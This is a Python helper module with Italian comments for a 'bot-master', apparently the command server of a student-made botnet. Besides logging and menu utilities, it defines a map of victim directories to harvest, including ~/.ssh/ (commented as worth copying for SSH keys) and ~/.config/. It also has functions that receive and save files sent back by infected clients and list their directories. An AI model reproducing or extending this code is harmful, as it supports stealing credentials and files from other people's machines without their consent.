"""
Codice sorgente contenente funzioni di supporto per il bot-master.

Scritto da:
       Valentino Bocchetti, Valentina Annunziata
       Francesco Ciccarelli, Giulia Caputo
Copyright (c) 2022. All rights reserved.
"""
import sys
import socket
# import asyncio
import aiofiles
import os

from sys import stderr
import asyncio
from asyncio.events import AbstractEventLoop
from signal import Signals

# Generate welcome message with ASCII text
# More at https://github.com/pwaller/pyfiglet
import pyfiglet


class SignalHaltError(SystemExit):
    """Classe Handler per la gestione dei segnali."""

    def __init__(self, signal_enum: Signals):
        """Auto settaggio componenti."""
        self.signal_enum = signal_enum
        print(repr(self), file=stderr)
        super().__init__(self.exit_code)

    @property
    def exit_code(self) -> int:
        """Funzione per l'exit code."""
        return self.signal_enum.value

    def __repr__(self) -> str:
        """Recupero segnale."""
        return f"\nExitted due to {self.signal_enum.name}"


def immediate_exit(signal_enum: Signals, loop: AbstractEventLoop) -> None:
    """Funzione per l'uscita immediata in caso di un segnale di Interrupt."""
    loop.stop()
    tasks = [t for t in asyncio.all_tasks() if t is not
             asyncio.current_task()]
    [task.cancel() for task in tasks]
    raise SignalHaltError(signal_enum=signal_enum)


"""
Funzioni ausiliare
"""

"""
TODO: Ampliare i values (sono quelli tra le parentesi []) con quelli specifici per MacOS (che dovrebbero essere in parte simili a quelli di Linux)
TODO: Per la gestione di recupero dati da win: https://stackoverflow.com/questions/13184414/how-can-i-get-the-path-to-the-appdata-directory-in-python
Struttura: key: [Linux, Win, MacOS]
"""
__filesystem_hierarchy = {"1": ["/", "C:/", "/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
                          "2": [f"/home/{os.getlogin()}/", f"C:/Users/{os.getlogin()}", f"/Users/{os.getlogin()}"],
                          "3": [f"/home/{os.getlogin()}/.ssh/"],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
                          "4": [],  # Recupero Immagini (?)
                          "5": [],  # Recupero Documenti (?)
                          "6": [f"/home/{os.getlogin()}/.config/"],  # Recupero File di config (?)
                          }


# Messaggio di benvenuto
def welcome_message(message: str):
    """Messaggio di benvenuto con pyfiglet."""
    print(pyfiglet.figlet_format(message))


# Funzione per il controllo di validità della porta
def port_validator(hostname: str, port: int) -> bool:
    """Controllo dei requisiti."""
    """
    Cannot bind to ports below 1024 without
    the CAP_NET_BIND_SERVICE capability.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        """If the port selected is not used the connect_ex return false"""
        return s.connect_ex((hostname, port)) == 0


def info(msg: str, level: int) -> None:
    """Funzione di stampa in caso di errore."""
    ANSI_COLOR_BLUE = "\x1b[34m"
    ANSI_COLOR_GREEN = "\x1b[32m"
    ANSI_COLOR_RED = "\x1b[31m"
    ANSI_COLOR_RESET = "\x1b[0m"

    match level:
        case 1:  # Logging Level: info
            print(f"{ANSI_COLOR_GREEN}[+] {msg}{ANSI_COLOR_RESET}", file=sys.stderr)  # Stampiamo in verde il messaggio di errore (in seguito resettiamo il colore a default)
        case 2:  # Logging Level: debug
            print(f"{ANSI_COLOR_BLUE}[+] {msg}{ANSI_COLOR_RESET}", file=sys.stderr)  # Stampiamo in blu il messaggio di errore (in seguito resettiamo il colore a default)
        case 3:  # Logging Level: error
            print(f"{ANSI_COLOR_RED}[!] {msg}{ANSI_COLOR_RESET}", file=sys.stderr)  # Stampiamo in rosso il messaggio di errore (in seguito resettiamo il colore a default)
        case 4:  # Logging Level: critical
            print(f"{ANSI_COLOR_RED}[!!] {msg}{ANSI_COLOR_RESET}", file=sys.stderr)  # Stampiamo in rosso il messaggio di errore (in seguito resettiamo il colore a default)
            sys.exit(1)


def print_menu(dictionary: dict, title: str, width=int) -> None:
    """Menu di scelta per l'operazione da effettuare."""
    north_box = f'╔{"═" * width}╗'  # upper_border
    south_box = f'╚{"═" * width}╝'  # lower_border
    print(north_box)
    print(f"║ {title}")
    for item in dictionary.keys():
        print("║\t", item.ljust(2), '--', dictionary[item])
    print(south_box)


def print_menu_with_list(list: list, title: str, width=int) -> None:  # TODO: Fondere il metodo
    """Menu di scelta per l'operazione da effettuare."""
    north_box = f'╔{"═" * width}╗'  # upper_border
    south_box = f'╚{"═" * width}╝'  # lower_border
    print(north_box)
    print(f"║ {title}")
    for item in list:
        print("║\t", list.index(item), '--', item)
    print(south_box)


async def receive_file(filename: str, content: str):
    """Funzione di ricezione file inviati dal client."""
    # print(f"{reader.readline()}")
    async with aiofiles.open(filename, "w+") as file:
        await file.write(content)
    # content = await reader.readline()
    # print(content.decode())
    # await filename.write(await reader.readline())
    # async with aiofiles.open(request, 'w') as filename:
    # await filename.write(await reader.readline())


def get_directory_list(parent_path: str):
    """Recupero info del contenuto delle directory."""
    for current_dir in os.listdir(parent_path):
        # Controlliamo di avere i permessi necessari per leggere nella directory
        if os.access(f"{parent_path}{current_dir}", os.R_OK) is True:
            print(f"Contenuto di {parent_path}{current_dir}:")
            content = os.listdir(f"{parent_path}{current_dir}")
            print(content)
        else:
            print(f"Per mancanza di permessi non viene mostrato il contenuto di {parent_path}{current_dir}")


def initialize_result_folder(current_directory: str, result_folder: str) -> None:
    """Controllo e creazione della directory utilizzata per il salvataggio di file ricevuti dal client."""
    if not os.path.exists(current_directory + "/" + result_folder):
        info(f"Creazione in corso della directory {current_directory}/{result_folder} non presente sul file system. ", 1)
        os.makedirs(current_directory + "/" + result_folder)


def file_system_navigator():
    """Funzione per la navigazione delle directory presenti sul client."""
